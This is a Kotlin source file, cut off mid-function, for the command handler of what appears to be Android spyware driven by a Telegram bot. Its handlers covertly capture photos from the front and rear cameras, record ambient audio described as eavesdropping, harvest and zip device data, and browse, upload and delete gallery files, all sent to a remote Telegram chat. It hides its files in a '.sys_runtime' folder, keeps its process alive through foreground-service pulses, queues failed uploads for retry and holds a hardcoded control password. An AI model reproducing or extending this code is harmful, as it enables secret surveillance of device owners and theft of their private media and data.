package com.example.app

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.os.Build
import android.util.Log
import androidx.core.content.ContextCompat
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.lang.ref.WeakReference
import java.lang.reflect.Method
import java.security.MessageDigest

import com.example.app.safeGetMessageId
import com.example.app.safeExtractCallbackData
import com.example.app.CallbackData

/**
 * فئة إدارة الأوامر الرئيسية للتحكم بكاميرا الجهاز، الميكروفون، المعرض والحصاد.
 * 
 * 📌 **الإيموجيات المستخدمة في الأزرار التفاعلية:**
 * ──────────────────────────────────────────────
 * | الإيموجي | الاستخدام                          |
 * |----------|------------------------------------|
 * | 📸       | التقاط صورة (كاميرا خلفية)        |
 * | 👁️       | التقاط صورة (كاميرا أمامية)       |
 * | 🎙️       | تنصت محيطي (تسجيل صوتي)           |
 * | 📦       | استخراج البيانات (حصاد)           |
 * | 🗂️       | أرشيف الوسائط (معرض)              |
 * | ⚡       | بث فوري (إرسال فوري)              |
 * | 🧬       | تحديث الشبكات (تحديث النموذج)     |
 * | 🟢       | جهاز متصل                         |
 * | 🔴       | جهاز غير متصل                     |
 * | 📱       | أيقونة الجهاز                     |
 * | 📡       | الأجهزة النشطة                    |
 * | 🧠       | محرك الذكاء                       |
 * | ⏳       | تمديد الجلسة                      |
 * | 📊       | تقرير النظام                      |
 * | 🗄️       | إدارة الأرشيف                     |
 * | 🔌       | قطع الاتصال                       |
 * | 🔙       | العودة للخلف / إلغاء              |
 * | 🏠       | القائمة الرئيسية                  |
 * | 🔃       | تحديث                             |
 * | 🔒       | قفل التحكم / تسجيل الخروج         |
 * | 🎯       | اقتناص بصري (خلفي)                |
 * | 👁️       | اقتناص بصري (أمامي)               |
 * | 🗑️       | حذف                               |
 * | ✅       | تأكيد / نجاح                      |
 * | ❌       | خطأ                               |
 * | ⚠️       | تحذير                             |
 * | 📤       | تحميل                             |
 * | 📥       | استقبال                           |
 * | 🖼️       | معرض الوسائط                      |
 * | 📄       | ملف نصي                           |
 * | 🎤       | تسجيل صوتي                        |
 * | 🔋       | البطارية                          |
 * | ⏳       | انتظار / جارٍ التنفيذ             |
 * | 🚀       | إرسال فوري                        |
 * | 📭       | لا توجد ملفات                     |
 * | 💾       | حجم الملف                         |
 * | ⏰       | الوقت / التوقيت                   |
 * ──────────────────────────────────────────────
 */
class Commands private constructor(context: Context) {

    private val contextRef = WeakReference(context.applicationContext)
    private val appContext: Context? get() = contextRef.get()

    @Volatile
    private var isMicBusy = false

    @Volatile
    private var stopRecordingFlag = false

    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // ========== المسارات والمجلدات ==========
    private val runtimeDir: File by lazy {
        File(appContext?.filesDir, ".sys_runtime").apply {
            if (!exists()) mkdirs()
        }
    }

    private val pendingDir: File by lazy {
        File(runtimeDir, "pending_upload").apply {
            if (!exists()) mkdirs()
        }
    }

    private val tempDir: File by lazy {
        File(runtimeDir, "ctmp").apply {
            if (!exists()) mkdirs()
        }
    }

    private val pendingTasksDir: File by lazy {
        File(runtimeDir, "pending_tasks").apply {
            if (!exists()) mkdirs()
        }
    }

    private val configFile: File by lazy {
        File(runtimeDir, "commands_config.json")
    }

    private val tasksFile: File by lazy {
        File(pendingTasksDir, "tasks.json")
    }

    private val config: MutableMap<String, Any> by lazy {
        loadConfig()
    }

    private val maxRetries = 5
    private val retryInterval = 600_000L // 10 دقائق

    // ✅ تخزين مؤقت للـ Method لتجنب البحث المتكرر
    private val methodCache = mutableMapOf<String, Method>()

    companion object {
        private const val TAG = "Commands"

        @Volatile
        private var instance: Commands? = null

        fun getInstance(context: Context): Commands {
            return instance ?: synchronized(this) {
                instance ?: Commands(context).also { instance = it }
            }
        }

        /**
         * نقطة دخول خارجية لتنفيذ الأوامر
         * 📌 الإيموجيات المستخدمة في callback_data:
         * - 📸 cam_, camf_ → كاميرا خلفية / أمامية
         * - 🎙️ mic_ → ميكروفون
         * - 📦 hrv_ → حصاد
         * - ⚡ send_now_ → إرسال فوري
         * - 🧬 update_model_ → تحديث النموذج
         * - 🗂️ media_ → معرض الوسائط
         * - 📡 ld → الأجهزة النشطة
         * - 🧠 ai_status → حالة محرك الذكاء
         * - ⏳ rnw → تمديد الجلسة
         * - 📊 status → تقرير النظام
         * - 🗄️ menu → إدارة الأرشيف
         * - 🔌 ext → قطع الاتصال
         */
        fun ex(
            context: Context,
            cmd: String,
            tg: Any?,
            m: Any?,
            cid: Long,
            cbq: String? = null
        ) {
            getInstance(context).execute(cmd, tg, m, cid, cbq)
        }
    }

    init {
        cleanupOldFiles()
        startRetryLoop()
    }

    // ============================================================
    //  دوال مساعدة: تحميل الإعدادات، إنشاء أسماء فريدة، حذف آمن
    // ============================================================

    private fun loadConfig(): MutableMap<String, Any> {
        val defaultConfig = mutableMapOf<String, Any>(
            "temp_file_age" to 3600,
            "pending_file_age" to 86400,
            "audio_duration" to 10,
            "min_audio_size" to 5000,
            "min_battery" to 15,
            "enable_logging" to true
        )
        if (configFile.exists()) {
            try {
                val json = JSONObject(configFile.readText())
                defaultConfig.keys.forEach { key ->
                    if (json.has(key)) {
                        defaultConfig[key] = json.get(key)
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Config load error: ${e.message}")
            }
        }
        return defaultConfig
    }

    private fun saveConfig() {
        try {
            configFile.writeText(JSONObject(config as Map<*, *>).toString(2))
        } catch (e: Exception) {
            Log.e(TAG, "Config save error: ${e.message}")
        }
    }

    private fun generateUniqueFilename(prefix: String = "file", ext: String = ".txt"): String {
        val timestamp = System.currentTimeMillis()
        val raw = "$timestamp${android.os.Process.myPid()}"
        val md = MessageDigest.getInstance("MD5")
        val digest = md.digest(raw.toByteArray())
        val hashHex = digest.take(4).joinToString("") { "%02x".format(it) }
        return "${prefix}_${timestamp}_$hashHex$ext"
    }

    private fun safeRemove(file: File?): Boolean {
        return try {
            file?.takeIf { it.exists() }?.delete() ?: false
        } catch (e: Exception) {
            Log.e(TAG, "Safe remove error for ${file?.absolutePath}: ${e.message}")
            false
        }
    }

    private fun cleanupOldFiles() {
        scope.launch {
            try {
                val now = System.currentTimeMillis()
                val tempMaxAge = (config["temp_file_age"] as? Number)?.toLong()?.times(1000) ?: 3600_000L
                val pendingMaxAge = (config["pending_file_age"] as? Number)?.toLong()?.times(1000) ?: 86400_000L

                mapOf(tempDir to tempMaxAge, pendingDir to pendingMaxAge).forEach { (dir, maxAge) ->
                    dir.listFiles()?.forEach { file ->
                        if (now - file.lastModified() > maxAge) {
                            safeRemove(file)
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "Cleanup error: ${e.message}")
            }
        }
    }

    private fun checkPermission(permission: String): Boolean {
        val ctx = appContext ?: return false
        return ContextCompat.checkSelfPermission(ctx, permission) == PackageManager.PERMISSION_GRANTED
    }

    private fun isBatteryOk(m: Any?): Boolean {
        if (m == null) return true
        return try {
            val method = m.javaClass.getMethod("getBatteryStatus")
            val result = method.invoke(m) as? Pair<*, *>
            if (result != null) {
                val battery = (result.first as? Number)?.toInt() ?: 100
                val isCharging = result.second as? Boolean ?: false
                val minBattery = (config["min_battery"] as? Number)?.toInt() ?: 15
                battery >= minBattery || isCharging
            } else {
                true
            }
        } catch (e: Exception) {
            Log.e(TAG, "Battery check error: ${e.message}")
            true
        }
    }

    // ============================================================
    //  التسجيل الصوتي (بديل _record_audio)
    // ============================================================

    private suspend fun recordAudio(durationSec: Int = 10): File? =
        withContext(Dispatchers.IO) {
            if (isMicBusy) {
                Log.w(TAG, "🎙️ Microphone is busy")
                return@withContext null
            }

            if (!checkPermission(Manifest.permission.RECORD_AUDIO)) {
                Log.e(TAG, "❌ RECORD_AUDIO permission not granted")
                return@withContext null
            }

            isMicBusy = true
            stopRecordingFlag = false

            val outFile = File(tempDir, generateUniqueFilename("audio", ".aac"))
            var recorder: MediaRecorder? = null

            try {
                recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    appContext?.let { MediaRecorder(it) } ?: MediaRecorder()
                } else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }

                recorder.apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                    setAudioEncodingBitRate(64000)
                    setOutputFile(outFile.absolutePath)
                    prepare()
                    start()
                }

                Log.i(TAG, "🎤 Recording audio for $durationSec seconds...")

                for (i in 0 until durationSec) {
                    if (stopRecordingFlag) {
                        Log.i(TAG, "⏹️ Recording stopped early by flag")
                        break
                    }
                    delay(1000)
                }

                try {
                    recorder.stop()
                } catch (e: Exception) {
                    Log.e(TAG, "❌ MediaRecorder stop error: ${e.message}")
                }

                recorder.reset()

                val minSize = (config["min_audio_size"] as? Number)?.toInt() ?: 5000
                if (outFile.exists() && outFile.length() >= minSize) {
                    Log.i(TAG, "✅ Audio recorded: ${outFile.length()} bytes")
                    return@withContext outFile
                } else {
                    Log.w(TAG, "⚠️ Audio file too small or missing: ${outFile.length()} bytes")
                    safeRemove(outFile)
                    return@withContext null
                }

            } catch (e: Exception) {
                Log.e(TAG, "❌ Recording error: ${e.message}")
                safeRemove(outFile)
                return@withContext null
            } finally {
                try {
                    recorder?.release()
                } catch (_: Exception) {}
                isMicBusy = false
            }
        }

    fun stopRecording() {
        stopRecordingFlag = true
        Log.i(TAG, "⏹️ Recording stop requested")
    }

    // ============================================================
    //  إدارة المهام الفاشلة (قائمة انتظار)
    // ============================================================

    private fun addTaskToQueue(
        type: String,
        filePath: String,
        chatId: Long,
        filename: String? = null,
        content: String? = null
    ) {
        try {
            val tasksArray = if (tasksFile.exists()) {
                JSONArray(tasksFile.readText())
            } else {
                JSONArray()
            }

            val taskObj = JSONObject().apply {
                put("id", generateUniqueFilename("task", ""))
                put("type", type)
                put("file_path", filePath)
                put("chat_id", chatId)
                put("filename", filename ?: "")
                put("content", content ?: "")
                put("created_at", System.currentTimeMillis())
                put("attempts", 0)
                put("last_attempt", 0)
            }

            tasksArray.put(taskObj)
            tasksFile.writeText(tasksArray.toString(2))
            Log.i(TAG, "📋 Task added to queue: $type")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Add task error: ${e.message}")
        }
    }

    private fun startRetryLoop() {
        scope.launch {
            while (isActive) {
                delay(retryInterval)
                retryFailedTasks()
            }
        }
    }

    private fun retryFailedTasks() {
        if (!tasksFile.exists()) return

        try {
            val tasksArray = JSONArray(tasksFile.readText())
            val remainingTasks = JSONArray()
            var removed = 0

            for (i in 0 until tasksArray.length()) {
                val task = tasksArray.getJSONObject(i)
                val attempts = task.optInt("attempts", 0)
                val lastAttempt = task.optLong("last_attempt", 0)
                val filePath = task.optString("file_path")
                val chatId = task.optLong("chat_id")
                val type = task.optString("type")
                val filename = task.optString("filename")
                val content = task.optString("content")

                if (attempts >= maxRetries) {
                    Log.w(TAG, "⚠️ Task ${task.optString("id")} exceeded max retries, removing.")
                    safeRemove(File(filePath))
                    removed++
                    continue
                }

                val waitTime = (1L shl attempts) * 60_000L
                if (lastAttempt > 0 && System.currentTimeMillis() - lastAttempt < waitTime) {
                    remainingTasks.put(task)
                    continue
                }

                Log.i(TAG, "🔄 Retrying task $type (attempt ${attempts + 1})")

                val success = when (type) {
                    "audio" -> {
                        val file = File(filePath)
                        if (file.exists()) {
                            false
                        } else {
                            removed++
                            true
                        }
                    }
                    "text_file" -> {
                        false
                    }
                    else -> false
                }

                if (success) {
                    safeRemove(File(filePath))
                    removed++
                } else {
                    task.put("attempts", attempts + 1)
                    task.put("last_attempt", System.currentTimeMillis())
                    remainingTasks.put(task)
                }
            }

            if (removed > 0) {
                tasksFile.writeText(remainingTasks.toString(2))
                Log.i(TAG, "✅ Retry completed, removed $removed tasks.")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Retry failed tasks error: ${e.message}")
        }
    }

    // ============================================================
    //  إرسال الملفات النصية (بديل _send_text_file)
    // ============================================================

    private suspend fun sendTextFile(tg: Any?, chatId: Long, content: String, filename: String) {
        if (content.isBlank()) {
            sendTelegramMessage(tg, chatId, "📄 $filename: لا يوجد محتوى")
            return
        }

        val tempFile = File(pendingDir, generateUniqueFilename(filename, ".txt"))
        try {
            tempFile.writeText(content, Charsets.UTF_8)

            if (tempFile.length() == 0L) {
                safeRemove(tempFile)
                sendTelegramMessage(tg, chatId, "📄 $filename: ملف فارغ")
                return
            }

            val success = sendTelegramDocument(tg, chatId, tempFile, "📄 $filename")
            if (success) {
                safeRemove(tempFile)
            } else {
                Log.w(TAG, "⚠️ Failed to send $filename, adding to queue")
                addTaskToQueue("text_file", tempFile.absolutePath, chatId, filename, content)
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Send text file error: ${e.message}")
            sendTelegramMessage(tg, chatId, "📄 $filename:\n${content.take(4000)}")
            safeRemove(tempFile)
        }
    }

    // ============================================================
    //  دوال تنفيذ الأوامر (نقطة الدخول الأساسية)
    // ============================================================

    fun execute(cmd: String, tg: Any?, m: Any?, cid: Long, cbq: String? = null) {
        scope.launch {
            try {
                if (cmd.isBlank()) return@launch

                cbq?.let { queryId ->
                    invokeTelegramMethod(tg, "answerCallbackQuery", mapOf("callback_query_id" to queryId))
                }

                when {
                    // أوامر المعرض القديمة والجديدة
                    cmd.startsWith("g_nav|") ||
                    cmd.startsWith("g_opt|") ||
                    cmd.startsWith("g_conf|") ||
                    cmd.startsWith("g_act|") ||
                    cmd.startsWith("g_bulk|") ||
                    cmd.startsWith("g_toggle|") ||
                    cmd.startsWith("g_selall|") ||
                    cmd.startsWith("g_zip|") ||
                    cmd.startsWith("g_upload|") ||
                    cmd.startsWith("g_del_sel|") ||
                    cmd.startsWith("g_conf_del|") ||
                    cmd.startsWith("g_conf_del_one|") -> handleGallery(cmd, tg, m, cid)

                    cmd.startsWith("cam_") || cmd.startsWith("camf_") -> handleCamera(cmd, tg, m, cid)

                    cmd.startsWith("mic_") -> handleMic(tg, m, cid)

                    cmd.startsWith("hrv_") -> handleHarvest(tg, m, cid)

                    cmd.startsWith("send_now_") -> handleSendNow(tg, m, cid)

                    cmd.startsWith("media_") -> handleMedia(tg, m, cid)

                    else -> sendTelegramMessage(tg, cid, "⚠️ أمر غير معروف. استخدم /menu لعرض القائمة.")
                }

            } catch (e: Exception) {
                Log.e(TAG, "❌ Command handler error: ${e.message}")
                sendTelegramMessage(tg, cid, "❌ خطأ داخلي: ${e.message?.take(100) ?: "Unknown"}")
            }
        }
    }

    // ============================================================
    //  معالج أوامر المعرض (Gallery) – دعم كامل للأوامر الجديدة والقديمة
    // ============================================================

    private suspend fun handleGallery(cmd: String, tg: Any?, m: Any?, cid: Long) {
        try {
            val parts = cmd.split("|")
            if (parts.size < 2) {
                sendTelegramMessage(tg, cid, "⚠️ أمر غير مكتمل")
                return
            }

            val action = parts[0]
            val galleryBrowser = getModuleComponent(m, "mediaScanner")

            if (galleryBrowser == null) {
                sendTelegramMessage(tg, cid, "❌ المعرض غير متاح")
                return
            }

            // الحصول على آخر message_id من Monitor (للأوامر التي تحتاج تحديث)
            val lastMid = getModuleField(m, "last_mid") as? Long

            when (action) {
                // التنقل بين الصفحات
                "g_nav" -> {
                    if (parts.size >= 3) {
                        val cat = parts[1]
                        val page = parts[2].toIntOrNull() ?: 0
                        val newKb = invokeMethod(galleryBrowser, "getGridKb", cat, page)
                        if (newKb != null) {
                            val msgId = lastMid ?: 0
                            invokeTelegramMethod(
                                tg,
                                "editMessageReplyMarkup",
                                mapOf(
                                    "chat_id" to cid,
                                    "message_id" to msgId,
                                    "reply_markup" to newKb.toString()
                                )
                            )
                        } else {
                            sendTelegramMessage(tg, cid, "⚠️ فشل تحديث المعرض")
                        }
                    }
                }

                // عرض خيارات ملف (معاينة)
                "g_opt" -> {
                    if (parts.size >= 4) {
                        invokeMethod(galleryBrowser, "showOptions", cid, parts[1], parts[2], parts[3])
                    }
                }

                // الإجراءات القديمة (g_act) – تستخدم للتوافق مع الأوامر القديمة
                "g_act" -> {
                    if (parts.size >= 5) {
                        val subAction = parts[1]
                        val cat = parts[2]
                        val page = parts[3].toIntOrNull() ?: 0
                        val index = parts[4].toIntOrNull() ?: -1
                        invokeMethod(
                            galleryBrowser,
                            "executeAction",
                            cid,
                            subAction,
                            cat,
                            page,
                            index,
                            lastMid
                        )
                    }
                }

                // تأكيد الحذف (للأوامر القديمة – تم تعديله لاستخدام g_conf_del_one)
                "g_conf" -> {
                    if (parts.size >= 5) {
                        val act = parts[1]
                        val cat = parts[2]
                        val pg = parts[3]
                        val idx = parts[4]
                        // إذا كان الإجراء del، نستخدم g_conf_del_one (النظام الجديد)
                        if (act == "del") {
                            val confirmKb = listOf(
                                listOf(
                                    mapOf(
                                        "text" to "🗑️ نعم، احذف",
                                        "callback_data" to "g_conf_del_one|$cat|$pg|$idx"
                                    ),
                                    mapOf(
                                        "text" to "🔙 إلغاء",
                                        "callback_data" to "g_opt|$cat|$pg|$idx"
                                    )
                                )
                            )
                            val jsonKb = JSONObject(mapOf("inline_keyboard" to confirmKb)).toString()
                            sendTelegramMessage(tg, cid, "⚠️ هل أنت متأكد من حذف هذا الملف؟", jsonKb)
                        } else {
                            // للأوامر القديمة الأخرى (إن وجدت)
                            val confirmKb = listOf(
                                listOf(
                                    mapOf(
                                        "text" to "🗑️ نعم، احذف",
                                        "callback_data" to "g_act|$act|$cat|$pg|$idx"
                                    ),
                                    mapOf(
                                        "text" to "🔙 إلغاء",
                                        "callback_data" to "g_opt|$cat|$pg|$idx"
                                    )
                                )
                            )
                            val jsonKb = JSONObject(mapOf("inline_keyboard" to confirmKb)).toString()
                            sendTelegramMessage(tg, cid, "⚠️ هل أنت متأكد؟", jsonKb)
                        }
                    }
                }

                // حذف مجموعة (قديم)
                "g_bulk" -> {
                    if (parts.size >= 3) {
                        val cat = parts[1]
                        val page = parts[2].toIntOrNull() ?: 0
                        invokeMethod(galleryBrowser, "executeAction", cid, "del_page", cat, page, null, lastMid)
                    }
                }

                // ========== الأوامر الجديدة ==========

                // تبديل تحديد ملف
                "g_toggle" -> {
                    if (parts.size >= 4) {
                        val cat = parts[1]
                        val page = parts[2].toIntOrNull() ?: 0
                        val index = parts[3].toIntOrNull() ?: -1
                        invokeMethod(galleryBrowser, "executeAction", cid, "toggle", cat, page, index, lastMid)
                    }
                }

                // تحديد/إلغاء الكل في الصفحة
                "g_selall" -> {
                    if (parts.size >= 3) {
                        val cat = parts[1]
                        val page = parts[2].toIntOrNull() ?: 0
                        invokeMethod(galleryBrowser, "executeAction", cid, "selall", cat, page, null, lastMid)
                    }
                }

                // ضغط المحدد
                "g_zip" -> {
                    if (parts.size >= 3) {
                        val cat = parts[1]
                        val page = parts[2].toIntOrNull() ?: 0
                        invokeMethod(galleryBrowser, "executeAction", cid, "zip", cat, page, null, lastMid)
                    }
                }

                // تحميل المحدد
                "g_upload" -> {
                    if (parts.size >= 3) {
                        val cat = parts[1]
                        val page = parts[2].toIntOrNull() ?: 0
                        invokeMethod(galleryBrowser, "executeAction", cid, "upload", cat, page, null, lastMid)
                    }
                }

                // حذف المحدد
                "g_del_sel" -> {
                    if (parts.size >= 3) {
                        val cat = parts[1]
                        val page = parts[2].toIntOrNull() ?: 0
                        invokeMethod(galleryBrowser, "executeAction", cid, "del_sel", cat, page, null, lastMid)
                    }
                }

                // تأكيد حذف الصفحة (يظهر أزرار تأكيد)
                "g_conf_del" -> {
                    if (parts.size >= 3) {
                        val cat = parts[1]
                        val page = parts[2].toIntOrNull() ?: 0
                        val confirmKb = listOf(
                            listOf(
                                mapOf(
                                    "text" to "🗑️ نعم، احذف الصفحة كلها",
                                    "callback_data" to "g_act|del_page|$cat|$page|0"
                                ),
                                mapOf(
                                    "text" to "🔙 إلغاء",
                                    "callback_data" to "g_nav|$cat|$page"
                                )
                            )
                        )
                        val jsonKb = JSONObject(mapOf("inline_keyboard" to confirmKb)).toString()
                        sendTelegramMessage(tg, cid, "⚠️ هل أنت متأكد من حذف كل ملفات الصفحة ${page + 1}؟", jsonKb)
                    }
                }

                // تأكيد حذف ملف واحد
                "g_conf_del_one" -> {
                    if (parts.size >= 4) {
                        val cat = parts[1]
                        val page = parts[2].toIntOrNull() ?: 0
                        val index = parts[3].toIntOrNull() ?: -1
                        val confirmKb = listOf(
                            listOf(
                                mapOf(
                                    "text" to "🗑️ نعم، احذف هذا الملف",
                                    "callback_data" to "g_act|del_one|$cat|$page|$index"
                                ),
                                mapOf(
                                    "text" to "🔙 إلغاء",
                                    "callback_data" to "g_opt|$cat|$page|$index"
                                )
                            )
                        )
                        val jsonKb = JSONObject(mapOf("inline_keyboard" to confirmKb)).toString()
                        sendTelegramMessage(tg, cid, "⚠️ هل أنت متأكد من حذف هذا الملف؟", jsonKb)
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Gallery handler error: ${e.message}")
            sendTelegramMessage(tg, cid, "❌ خطأ في معالج المعرض")
        }
    }

    // ============================================================
    //  معالج أوامر الكاميرا (مع إرسال نبض للخدمة الأمامية)
    // ============================================================

    private suspend fun handleCamera(cmd: String, tg: Any?, m: Any?, cid: Long) {
        try {
            val isFront = if (cmd.contains("camf_")) 1 else 0

            if (!isBatteryOk(m)) {
                sendTelegramMessage(tg, cid, "🔋 البطارية منخفضة جداً")
                return
            }

            val cameraAnalyzer = getModuleComponent(m, "cameraAnalyzer")
            if (cameraAnalyzer == null) {
                sendTelegramMessage(tg, cid, "❌ الكاميرا غير متاحة")
                return
            }

            // ✅ إرسال نبض للخدمة الأمامية قبل التقاط الصورة (لتجنب قتل العملية)
            sendPulseIntent("📸 Visual Sync")

            sendTelegramAction(tg, cid, "upload_photo")

            scope.launch {
                try {
                    invokeMethod(cameraAnalyzer, "harvest", isFront)
                } catch (e: Exception) {
                    Log.e(TAG, "❌ Camera harvest error: ${e.message}")
                }
            }

            sendTelegramMessage(tg, cid, "📸 تم التقاط الصورة وتحليلها.")
        } catch (e: Exception) {
            Log.e(TAG, "❌ Camera handler error: ${e.message}")
            sendTelegramMessage(tg, cid, "❌ خطأ في الكاميرا")
        }
    }

    // ============================================================
    //  معالج أوامر الميكروفون (مع إرسال نبض للخدمة الأمامية)
    // ============================================================

    private suspend fun handleMic(tg: Any?, m: Any?, cid: Long) {
        try {
            if (isMicBusy) {
                sendTelegramMessage(tg, cid, "⏳ التسجيل قيد التنفيذ")
                return
            }

            // ✅ إرسال نبض للخدمة الأمامية قبل بدء التسجيل
            sendPulseIntent("🎙️ Audio Sync")

            stopRecordingFlag = false
            val duration = (config["audio_duration"] as? Number)?.toInt() ?: 10
            sendTelegramMessage(tg, cid, "🎤 جاري التسجيل لمدة $duration ثوانٍ...")

            scope.launch {
                val audioPath = recordAudio(duration)
                if (audioPath != null && audioPath.exists()) {
                    val target = getModuleField(m, "vlt") as? Long ?: cid
                    val success = sendTelegramVoice(tg, target, audioPath)
                    if (success) {
                        safeRemove(audioPath)
                    } else {
                        Log.w(TAG, "⚠️ Failed to send audio, adding to pending tasks")
                        addTaskToQueue("audio", audioPath.absolutePath, target)
                    }
                } else {
                    sendTelegramMessage(tg, cid, "❌ فشل التسجيل (الملف صغير جداً أو تالف)")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Mic handler error: ${e.message}")
            sendTelegramMessage(tg, cid, "❌ خطأ في الميكروفون")
        }
    }

    // ============================================================
    //  معالج الحصاد (Harvest) (مع إرسال نبض للخدمة الأمامية)
    // ============================================================

    private suspend fun handleHarvest(tg: Any?, m: Any?, cid: Long) {
        try {
            // ✅ إرسال نبض للخدمة الأمامية قبل بدء الحصاد
            sendPulseIntent("📦 Data Harvest")

            val dailyZipper = getModuleComponent(m, "dailyZipper")
            if (dailyZipper != null) {
                sendTelegramMessage(tg, cid, "📦 بدء الحصاد... قد يستغرق دقائق")
                scope.launch {
                    try {
                        invokeMethod(dailyZipper, "run")
                    } catch (e: Exception) {
                        Log.e(TAG, "❌ Harvest error: ${e.message}")
                    }
                }
            } else {
                sendTelegramMessage(tg, cid, "❌ وحدة الحصاد غير جاهزة")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Harvest handler error: ${e.message}")
            sendTelegramMessage(tg, cid, "❌ خطأ في الحصاد")
        }
    }

    // ============================================================
    //  معالج الإرسال الفوري (Send Now)
    // ============================================================

    private suspend fun handleSendNow(tg: Any?, m: Any?, cid: Long) {
        try {
            val dailyZipper = getModuleComponent(m, "dailyZipper")
            if (dailyZipper != null) {
                sendTelegramMessage(tg, cid, "🚀 جاري إرسال الملفات المضغوطة فوراً...")
                scope.launch {
                    try {
                        val success = invokeMethod(dailyZipper, "forceSendNow", cid) as? Boolean
                        if (success == false) {
                            Log.w(TAG, "⚠️ Force send failed, tasks will be retried later")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "❌ Force send error: ${e.message}")
                    }
                }
            } else {
                sendTelegramMessage(tg, cid, "❌ وحدة الحصاد غير متاحة")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Send now handler error: ${e.message}")
            sendTelegramMessage(tg, cid, "❌ خطأ في الإرسال الفوري")
        }
    }

    // ============================================================
    //  معالج فتح المعرض (Media)
    // ============================================================

    private suspend fun handleMedia(tg: Any?, m: Any?, cid: Long) {
        try {
            val galleryBrowser = getModuleComponent(m, "mediaScanner")
            if (galleryBrowser != null) {
                val kb = invokeMethod(galleryBrowser, "getGridKb", "pending", 0)
                val jsonKb = kb?.toString() ?: ""
                val response = sendTelegramMessage(tg, cid, "🖼️ معرض الوسائط", jsonKb)
                val msgId = response.safeGetMessageId()
                if (msgId != null) {
                    // تحديث last_mid في Monitor
                    setModuleField(m, "last_mid", msgId)
                    // تحديث lastMessageIdMap في GalleryBrowser
                    invokeMethod(galleryBrowser, "updateLastMessageId", cid, msgId)
                }
            } else {
                sendTelegramMessage(tg, cid, "❌ المعرض غير متاح")
            }
        } catch (e: Exception) {
            Log.e(TAG, "❌ Media handler error: ${e.message}")
            sendTelegramMessage(tg, cid, "❌ خطأ في فتح المعرض")
        }
    }

    // ============================================================
    //  الدوال الخارجية لنظام التحكم
    // ============================================================

    fun forceSendZip(m: Any?, deviceId: String, tg: Any?, chatId: Long) {
        scope.launch {
            try {
                val dailyZipper = getModuleComponent(m, "dailyZipper")
                if (dailyZipper != null) {
                    invokeMethod(dailyZipper, "forceSendNow", chatId)
                } else {
                    sendTelegramMessage(tg, chatId, "❌ وحدة الحصاد غير جاهزة")
                }
            } catch (e: Exception) {
                Log.e(TAG, "❌ forceSendZip error: ${e.message}")
                sendTelegramMessage(tg, chatId, "❌ خطأ في الإرسال: ${e.message?.take(100)}")
            }
        }
    }

    // ============================================================
    //  دوال الانعكاس (Reflection) للتعامل مع المكونات الأخرى
    // ============================================================

    private fun getModuleComponent(target: Any?, fieldName: String): Any? {
        if (target == null) return null
        return try {
            val field = target.javaClass.getDeclaredField(fieldName)
            field.isAccessible = true
            field.get(target)
        } catch (e: Exception) {
            null
        }
    }

    private fun getModuleField(target: Any?, fieldName: String): Any? {
        if (target == null) return null
        return try {
            val field = target.javaClass.getDeclaredField(fieldName)
            field.isAccessible = true
            field.get(target)
        } catch (e: Exception) {
            null
        }
    }

    private fun setModuleField(target: Any?, fieldName: String, value: Any?) {
        if (target == null) return
        try {
            val field = target.javaClass.getDeclaredField(fieldName)
            field.isAccessible = true
            field.set(target, value)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Set field error: ${e.message}")
        }
    }

    /**
     * استدعاء دالة على كائن عبر الانعكاس مع مطابقة عدد المعاملات فقط.
     * ✅ تم إضافة تخزين مؤقت للـ Method لتحسين الأداء.
     */
    private fun invokeMethod(target: Any?, methodName: String, vararg args: Any?): Any? {
        if (target == null) return null

        val key = "${target.javaClass.name}.$methodName(${args.size})"
        var method = methodCache[key]

        if (method == null) {
            method = target.javaClass.methods.firstOrNull { m ->
                m.name == methodName && m.parameterTypes.size == args.size
            }
            if (method == null) {
                Log.e(TAG, "❌ Method not found: $methodName with ${args.size} parameters")
                return null
            }
            method.isAccessible = true
            methodCache[key] = method
        }

        return try {
            method.invoke(target, *args)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Method invocation error ($methodName): ${e.message}")
            null
        }
    }

    // ============================================================
    //  ✅ دالة مساعدة للتحقق من كلمة السر (تُستخدم عند استقبال الأوامر النصية)
    // ============================================================

    /**
     * التحقق من صحة كلمة السر المدخلة.
     * @param inputSecret كلمة السر المدخلة
     * @param expectedSecret كلمة السر المتوقعة (افتراضياً "Zaen123@123@")
     * @return true إذا تطابقت، false وإلا
     */
    fun validateControlPassword(inputSecret: String, expectedSecret: String = "Zaen123@123@"): Boolean {
        return inputSecret.trim() == expectedSecret
    }

    // ============================================================
    //  دوال الاتصال بـ Telegram API
    // ============================================================

    private fun invokeTelegramMethod(tg: Any?, method: String, params: Map<String, Any>): Any? {
        if (tg == null) return null
        return try {
            val apiMethod = tg.javaClass.methods.firstOrNull { it.name == "_api" || it.name == "api" }
            apiMethod?.isAccessible = true

            val rawParams = HashMap<Any?, Any?>(params)

            // ✅ تحويل reply_markup إلى JSON صحيح إذا كان Map
            if (rawParams.containsKey("reply_markup") && rawParams["reply_markup"] !is String) {
                val markup = rawParams["reply_markup"]
                rawParams["reply_markup"] = when (markup) {
                    is Map<*, *> -> JSONObject(markup).toString()
                    is JSONObject -> markup.toString()
                    else -> markup.toString()
                }
            }

            apiMethod?.invoke(tg, method, rawParams)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Telegram API call error: ${e.message}")
            null
        }
    }

    private suspend fun sendTelegramMessage(
        tg: Any?,
        chatId: Any,
        text: String,
